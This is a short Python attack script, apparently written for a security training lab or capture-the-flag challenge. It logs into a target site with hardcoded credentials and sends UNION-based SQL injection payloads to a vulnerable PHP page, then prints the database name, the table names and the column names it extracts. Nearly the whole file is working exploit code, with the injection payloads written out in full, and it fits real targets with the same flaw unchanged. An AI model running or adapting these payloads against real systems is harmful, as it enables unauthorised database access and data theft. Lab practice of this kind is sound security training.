import sys, re, requests, html
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
requests.packages.urllib3.disable_warnings()
A = "http://xebec.cylabacademy.net:47074"
U, P = "hx8105", "Passw0rd!"
s = requests.Session()
s.headers.update({"User-Agent": "Mozilla/5.0"})
s.post(A + "/login.php", data={"username": U, "password": P}, timeout=20, allow_redirects=True)


def lines_of(payload):
    r = s.get(A + "/vuln.php", params={"q": payload}, timeout=20)
    t = re.sub(r"<script.*?</script>", " ", r.text, flags=re.S)
    t = re.sub(r"<[^>]+>", "\n", t)
    t = html.unescape(t)
    return [l.strip() for l in t.split("\n") if l.strip()]


def show(label, payload):
    print("=== %s ===" % label)
    try:
        L = lines_of(payload)
        # afficher a partir de "Results"
        try:
            i = L.index("Results")
            L = L[i:]
        except ValueError:
            pass
        for l in L[:28]:
            print("  ", l[:200])
    except Exception as e:
        print("  ERR", type(e).__name__)
    print()


show("db", "' UNION SELECT 1,database()-- -")
show("tables", "' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -")
show("colonnes (1ere table)", "' UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_schema=database()-- -")
